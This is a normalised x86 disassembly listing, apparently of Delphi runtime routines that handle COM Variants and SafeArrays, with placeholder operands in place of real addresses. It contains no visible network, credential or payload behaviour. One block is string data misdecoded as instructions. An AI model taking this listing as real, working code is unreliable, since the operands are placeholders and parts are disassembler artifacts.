call sub_4041d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d79
lea eax [ ebp - 0x208 ]
call sub_403f6c
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404278
sub_413e1c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_413df0
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_403fc0
mov eax esi
mov edx ebx
call sub_412704
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413e48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413e91
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4047c4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_413ea0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413e98
lea eax [ ebp - 0x4 ]
call sub_404678
retn
sub_413ea0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_413df0
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_4046b4
mov eax esi
mov edx ebx
call sub_412e2c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413ef0
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_413ef0
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_413f34
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
mov [ ebp - 0x2 ] cx
mov ebx edx
mov esi eax
test bl 0x1
je r-xdata
call sub_40eb1c
cmp ebx 0x7f
jg r-xdata
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
adc ebx 0x0
mov ax [ ebp - 0x2 ]
call sub_4140ac
test al al
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
call SafeArrayCreate
mov ebx eax
test ebx ebx
jne r-xdata
inc ebx
lea edx [ ebp - 0x208 ]
mov eax esi
inc ebx
sar ebx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
call sub_40f174
mov ax [ ebp - 0x2 ]
or ax 0x2000
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40eb1c
mov ecx edx
mov esi [ eax ]
mov [ ecx + 0x4 ] esi
mov esi [ eax + 0x4 ]
sub esi [ ecx + 0x4 ]
inc esi
mov [ ecx ] esi
add eax 0x8
add edx 0x8
dec ebx
jne r-xdata
sub_413fdc
push ebx
add esp 0xfffffff8
mov ebx eax
mov ecx esp
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_413ef0
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax 0x80070057
call sub_40edc4
sub_414004
push ebx
add esp 0xfffffff8
mov ebx eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_413ef0
test al al
je r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_41402c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_413fdc
push eax
call SafeArrayGetLBound
call sub_40edc4
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_414050
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_413fdc
push eax
call SafeArrayGetUBound
call sub_40edc4
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_414074
push ebx
push ecx
mov ebx eax
push esp
mov eax ebx
call sub_413fdc
push eax
call SafeArrayAccessData
call sub_40edc4
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4140cc
push ebx
push esi
mov ebx eax
movzx esi bx
and esi 0xffffbfff
mov eax esi
sub eax 0x16
jae r-xdata
mov eax ebx
call sub_413dd0
test al al
jne r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 + 0x1 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_414108
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0xc ]
call sub_413ef0
test al al
jne r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax 0x80070057
call sub_40edc4
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4141c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40edc4
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayGetElement
call sub_40edc4
mov [ ebp - 0x10 ] bx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40edc4
mov eax [ ebp - 0x1c ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40f49c
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_40f49c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141cf
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
sub_4141d4
push ebp
mov ebp esp
push ebx
mov ebx ecx
inc ebx
jle r-xdata
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_414108
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ edx + ecx * 4 ]
dec ecx
jns r-xdata
sub_4141f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0x8 ]
call sub_413ef0
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1a ]
mov eax esi
call sub_413ef0
test al al
jne r-xdata
mov eax 0x80070057
call sub_40edc4
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ax [ ebp - 0x1a ]
call sub_4140cc
test al al
jne r-xdata
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40edc4
cmp [ ebp - 0x1a ] 0x100
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414330
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0xc
jne r-xdata
cmp [ ebp - 0x1a ] 0x100
jne r-xdata
mov eax 0x80020005
call sub_40edc4
mov edx esi
lea eax [ ebp - 0x10 ]
mov ecx ebx
call sub_40f9e0
add ebx 0xfffffff8
sub ebx 0x2
jb r-xdata
mov edx esi
lea eax [ ebp - 0x10 ]
call j_sub_40f730
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40edc4
mov eax [ ebp - 0x24 ]
mov edx esi
call sub_40f49c
jmp r-xdata
mov ax [ ebp - 0x1a ]
call sub_413dd0
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
sub ebx 0x3
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPutElement
call sub_40edc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
sub_414340
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
js r-xdata
mov ebx [ ebp + 0x8 ]
inc ebx
push ebx
push edx
push eax
call sub_4141f8
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ ecx + ebx * 4 ]
dec ebx
jns r-xdata
sub_414368
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi [ ebp + 0x8 ]
mov ebp eax
xor ebx ebx
test ecx ecx
jge r-xdata
xor eax eax
mov al [ edi + 0x1 ]
add edi eax
mov eax [ esi + ebx * 4 ]
mul [ edi + 0x2 ]
mov edi [ edi + 0x6 ]
test edi edi
je r-xdata
mov ebp [ ebp ]
add ebp eax
inc ebx
cmp ebx ecx
jle r-xdata
mov edi [ edi ]
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4143e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] 0x1
mov ebx eax
mov eax edx
call sub_4143c4
dec eax
test eax eax
jle r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] eax
dec [ esp + 0x4 ]
jne r-xdata
mov eax ebx
call sub_4143dc
mov esi eax
mov eax [ ebx ]
call sub_4143dc
mov ebp eax
dec esi
test esi esi
jle r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebx ]
mov edi 0x1
inc edi
dec esi
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov eax [ ebx + edi * 4 ]
call sub_4143dc
cmp ebp eax
je r-xdata
sub_41444c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
call sub_4143c4
mov esi eax
push esi
mov eax ebp
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051d0
add esp 0x4
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4143dc
dec eax
mov edx [ ebp ]
mov [ edx + edi * 4 ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
sub_4144a0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ edi ]
call sub_40501c
mov edx eax
test edx edx
jl r-xdata
test bl bl
je r-xdata
inc edx
xor eax eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
call sub_40501c
cmp eax 0x0
jl r-xdata
inc eax
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov ecx [ edi ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 ] edx
dec eax
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
sub_41450c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi eax
mov eax edx
call sub_4143c4
mov ebp eax
mov eax ebp
add eax eax
push eax
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051d0
add esp 0x4
xor ebx ebx
jmp r-xdata
mov eax ebp
add eax eax
cmp ebx eax
jl r-xdata
mov eax [ edi ]
xor edx edx
mov [ eax + ebx * 4 ] edx
inc ebx
test esi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov eax esi
call sub_4143dc
dec eax
mov edx [ edi ]
mov [ edx + ebx * 4 ] eax
mov esi [ esi ]
sub_414564
push ebx
mov ebx 0x1
test eax eax
je r-xdata
cmp ebx 0x1
jle r-xdata
cmp [ eax ] 0x11
jne r-xdata
call sub_40e93c
cmp ebx 0xe
je r-xdata
xor edx edx
mov dl [ eax + 0x1 ]
add eax edx
mov ebx [ eax + 0xa ]
cmp ebx 0x48
jne r-xdata
cmp ebx 0xf
je r-xdata
mov ebx 0x100
cmp ebx 0x14
jle r-xdata
mov eax ebx
pop ebx
retn
cmp ebx 0x100
je r-xdata
sub_4145ac
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4148ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4052f0
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_4052f0
mov eax [ ebp - 0x4 ]
call sub_40f174
mov ebx esi
mov eax ebx
call sub_414564
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x100
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x18 ] 0x8
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_41450c
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax edi
call sub_41444c
lea ecx [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0xc ]
call sub_4051dc
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40501c
mov edx eax
mov cx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_413f34
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40f49c
mov eax [ ebp - 0x4 ]
call sub_414074
xor eax eax
push ebp
push sub_4148b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax edi
call sub_4143e4
test al al
je r-xdata
mov eax ebx
call sub_4143c4
dec eax
jle r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4144a0
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xb
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148f5
lea eax [ ebp - 0x38 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a20
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404a20
retn
push esi
mov eax [ ebp - 0x10 ]
call sub_40501c
mov ecx eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_414368
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414094
retn
cmp eax 0x12
jg r-xdata
je r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
mov dx [ ebx ]
neg dx
sbb edx edx
neg edx
call sub_41374c
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0x4
call sub_41357c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movzx edx [ ebx ]
mov cl 0x2
call sub_41357c
jmp r-xdata
sub eax 0xc
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_40501c
push eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_414340
lea eax [ ebp - 0x28 ]
call sub_40f174
jmp [ eax * 4 + jump_table_4146dc ]
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
push edx
push eax
lea eax [ ebp - 0x28 ]
call sub_413678
jmp r-xdata
sub eax 0xec
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_40f49c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xfe
call sub_41357c
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_41357c
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413774
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413774
jmp r-xdata
fild [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_41379c
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413774
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_41382c
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413890
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_41357c
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_4137b0
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413864
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xff
call sub_41357c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
xor edx edx
mov dl [ ebx ]
mov cl 0x1
call sub_41357c
jmp r-xdata
jmp r-xdata
sub_4148fc
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414bfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_414004
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_414074
xor edx edx
push ebp
push sub_414bcd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_40278c
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
mov eax 0x80070057
call sub_40edc4
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov ebx edi
mov edx ebx
call sub_405044
mov eax ebx
call sub_4143c4
mov eax ebx
call sub_414564
mov esi eax
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx edi
call sub_41444c
lea ecx [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0x14 ]
call sub_4051dc
inc esi
xor ebx ebx
cmp eax 0x12
jg r-xdata
je r-xdata
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_414050
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_41402c
pop edx
sub edx eax
inc edx
mov eax [ ebp - 0x10 ]
mov [ eax + ebx * 4 ] edx
inc ebx
dec esi
jne r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_4111ac
mov [ ebx ] ax
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
call sub_410868
mov [ ebx ] eax
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40fda4
mov [ ebx ] ax
jmp r-xdata
sub eax 0xc
je r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4144a0
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_414a2b ]
lea eax [ ebp - 0x28 ]
call sub_410868
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
jmp r-xdata
sub eax 0xec
je r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_40f49c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40501c
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_4141d4
push edi
mov eax [ ebp - 0x18 ]
call sub_40501c
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
call sub_414368
mov ebx eax
mov eax esi
cmp eax 0xb
jg r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bd4
mov eax [ ebp - 0x8 ]
call sub_414094
retn
lea eax [ ebp - 0x28 ]
call sub_40fda4
mov [ ebx ] ax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_40fda4
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_4116f4
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_4116f4
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_412050
fistp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_4116f4
fstp [ ebx ]
fwait
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_412e2c
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_4134d0
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_410868
mov [ ebx ] eax
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_412704
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_413404
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40fda4
mov [ ebx ] al
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40fda4
mov [ ebx ] al
jmp r-xdata
jmp r-xdata
sub_414bd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c04
lea eax [ ebp - 0x28 ]
call sub_40f188
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a20
retn
sub_414c21
fsubr st2
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
in al dx
popad
outsb
je r-xdata
add al 0x0
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_415800
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_415120
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_414c30
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414c91
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_405014
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c98
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_40321c
sub_414ce0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_415120
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_415800
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_414d34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414d6c
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_415120
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414da8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov cx [ rw-data ]
xor edx edx
mov eax esi
call sub_414dec
inc [ rw-data ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_414dec
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x8 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415049
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4031ec
push rw-data
call EnterCriticalSection
xor ecx ecx
push ebp
push sub_41501c
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx ebx [ ebp - 0x8 ]
sub ebx 0x100
test ebx ebx
jl r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
cmp [ ebp - 0x8 ] 0x10f
jae r-xdata
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
mov eax ebx
mov ecx 0xf
cdq
idiv ecx
inc eax
mov edi eax
shl edi 0x4
sub edi eax
cmp edi 0x7ff
jle r-xdata
mov eax [ rw-data ]
call sub_405014
mov esi eax
cmp esi ebx
jg r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + ebx * 4 ] edx
mov eax [ ebp - 0x4 ]
mov dx [ ebp - 0x8 ]
mov [ eax + 0x4 ] dx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415023
push rw-data
call LeaveCriticalSection
retn
cmp eax [ rw-data ]
jne r-xdata
push edi
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051d0
add esp 0x4
mov edx esi
push edx
mov eax [ rw-data ]
call sub_405014
dec eax
pop edx
sub eax edx
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
mov eax [ eax ]
lea edx [ ebp - 0x13c ]
call sub_40316c
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x4
lea eax [ ebp - 0x3c ]
push eax
push 0x2
lea edx [ ebp - 0x140 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x140 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x24 ]
mov dl 0x1
